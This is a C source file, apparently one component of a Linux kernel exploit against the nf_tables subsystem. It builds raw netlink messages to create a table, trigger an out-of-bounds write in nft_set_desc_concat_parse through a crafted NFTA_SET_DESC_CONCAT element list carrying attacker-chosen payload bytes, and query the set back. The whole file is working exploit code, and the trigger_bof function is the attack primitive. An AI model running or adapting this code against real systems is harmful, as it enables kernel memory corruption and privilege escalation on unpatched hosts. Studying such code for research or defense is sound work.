#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include "log.h"
#include "netlink.h"
#include "nf_tables.h"

/**
 * create_table(): Register a new table for the inet family
 * @sock: socket bound to the netfilter netlink
 * @name: Name of the new table
 */
void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

    /* Netlink batch_end message preparation */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

/**
 * trigger_bof(): Trigger the out-of-bound into nft_set_desc_concat_parse
 * @sock: Socket bound to the netfilter netlink
 * @payload: Data to write out of the buffer
 * @payload_size: Size of the payload to write
 * @payload_start_offset: Position after the end of the buffer
 * @set_name: Name of set that will be created
 * @table_name: Name of a registered table
 * @id: Set id
 */
void trigger_bof(int sock, const uint8_t *payload, uint8_t payload_size, uint8_t payload_start_offset, const char *set_name, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    uint8_t nb_elems;
    uint32_t nlh_payload_size;
    struct nfgenmsg *nfm;

    /* Parameters verification */
    if (payload_start_offset > BOF_MAX_BYTE_VALUE) {
        printf("[-] %s: payload_start_offset is too big: %d > %d\n", __func__, payload_start_offset, BOF_MAX_BYTE_VALUE);
        exit(EXIT_FAILURE);
    }

    if (payload_size > MAX_PAYLOAD_SIZE(payload_start_offset)) {
        printf("[-] %s: payload_size is too big: %d > %d\n", __func__, payload_size, MAX_PAYLOAD_SIZE(payload_start_offset));
        exit(EXIT_FAILURE);
    }

    for (uint32_t k = 0; k < payload_size; k++) {
        if (payload[k] > BOF_MAX_BYTE_VALUE) {
            printf("[-] %s: payload[%d] is too big: %d > %d\n", __func__, k, payload[k], BOF_MAX_BYTE_VALUE);
            exit(EXIT_FAILURE);
        }
    }

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Compute needed memory for the payload */
    nb_elems = NFT_REG32_COUNT;                                                     // Size of the buffer to overflow
    nb_elems += 1;                                                                  // Position to erase in order to have an OOB
    nb_elems += payload_size;                                                       // Payload size in bytes

    nlh_payload_size = sizeof(struct nfgenmsg);                                     // Mandatory
    nlh_payload_size += NLA_HDRLEN;                                      // NFTA_SET_DESC
    nlh_payload_size += NLA_HDRLEN;                                      // NFTA_SET_DESC_CONCAT
    nlh_payload_size += nb_elems*(NLA_HDRLEN + U32_NLA_SIZE);            // Payload
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_TABLE
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_NAME
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_ID
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_KEY_LEN
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);                               // nlmsghdr + alignment

    /* Netlink payload message preparation */
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        do_error_exit("malloc");

    memset(nlh_payload, 0, nlh_payload_size);
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;

    /* Setup nfgenmsg */
    nfm = NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg));
    attr = set_nested_attr(attr, NFTA_SET_DESC, NLA_HDRLEN + nb_elems*(NLA_HDRLEN + U32_NLA_SIZE));
    attr = set_nested_attr(attr, NFTA_SET_DESC_CONCAT, nb_elems*(NLA_HDRLEN + U32_NLA_SIZE));

    /* Buffer filling*/
    for (uint32_t i = 0; i < NFT_REG32_COUNT; i++) {
        attr = set_nested_attr(attr, NFTA_LIST_ELEM, U32_NLA_SIZE);
        attr = set_u32_attr(attr, NFTA_SET_FIELD_LEN, 0);
    }
    /* Overwrite position field */
    attr = set_nested_attr(attr, NFTA_LIST_ELEM, U32_NLA_SIZE);
    attr = set_u32_attr(attr, NFTA_SET_FIELD_LEN, payload_start_offset);

    /* Proceed to the Out Of Bound write */
    for (uint32_t j = 0; j < payload_size; j++) {
        attr = set_nested_attr(attr, NFTA_LIST_ELEM, U32_NLA_SIZE);
        attr = set_u32_attr(attr, NFTA_SET_FIELD_LEN, payload[j]);
    }

    /* Filling the necessary other attributes */
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, NFT_DATA_VALUE_MAXLEN);

    /* Prepare END_BATCH message */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Sending message */
    sendmsg(sock, &msg, 0);

    /* Free all used structure */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

/**
 * get_set(): Send a request to get information about a registered set
 * @sock: Socket bound to the netfilter netlink
 * @table_name: Name of the table associated to the wanted set
 * @set_name: Name of the wanted set information
 */
void get_set(int sock, const char *table_name, const char *set_name) {

    struct msghdr msg;
    struct nlmsghdr *nlh;
    struct iovec iov[1];
    uint32_t msg_size;
    struct nlattr *attr;
    struct sockaddr_nl dest_snl;
    struct nfgenmsg *nfm;

    // Destination preparation
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;

    /* Compute the message size */
    msg_size = sizeof(struct nfgenmsg);     // mandatory
    msg_size += S8_NLA_SIZE;                // NFTA_SET_TABLE
    msg_size += S8_NLA_SIZE;                // NFTA_SET_NAME
    msg_size = NLMSG_SPACE(msg_size);

    /* Allocation of memory for the netlink msg */
    nlh = (struct nlmsghdr *)malloc(msg_size);
    if (!nlh)
        do_error_exit("malloc");

    /* Setup data for a getset request */
    memset(nlh, 0, msg_size);
    nlh->nlmsg_len = msg_size;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETSET;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    /* Setup nfgenmsg */
    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET; // Should set something different from 0

    /* Attributes setup */
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    set_str8_attr(attr, NFTA_SET_NAME, set_name);

    memset(iov, 0, sizeof(struct iovec));
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    free(nlh);
}
